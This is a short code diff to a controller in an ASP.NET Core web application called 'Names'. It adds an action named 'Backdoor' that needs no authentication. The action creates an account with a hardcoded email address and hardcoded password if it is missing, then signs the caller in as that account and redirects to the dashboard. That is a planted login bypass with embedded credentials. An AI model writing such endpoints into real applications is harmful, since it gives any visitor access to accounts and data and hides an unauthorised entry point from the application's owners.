@@ -105,5 +105,34 @@ namespace Names.Controllers
         {
             return View();
         }
+
+
+        /// <summary>
+        /// TODO
+        /// </summary>
+        /// <returns></returns>
+        public async Task<IActionResult> Backdoor()
+        {
+            var username = "johnjlee316@gmail.com";
+            IdentityUser iuser = await _userManager.FindByNameAsync(username);
+
+            // Check if new user registered  
+            if (iuser == null)
+            {
+                // Register New User
+                iuser = new IdentityUser(username);
+                iuser.Email = username;
+
+                var creation = await _userManager.CreateAsync(iuser, "NamesManager#2017"); // Dummy Pswd, never used
+                if (!creation.Succeeded)
+                {
+                    throw new Exception("Unable to register new user. Please try back later.");
+                }
+            }
+
+            // Signin and goto dashboard
+            await _signInManager.SignInAsync(iuser, false);
+            return RedirectToAction("Dashboard", "Home");
+        }
     }
 }
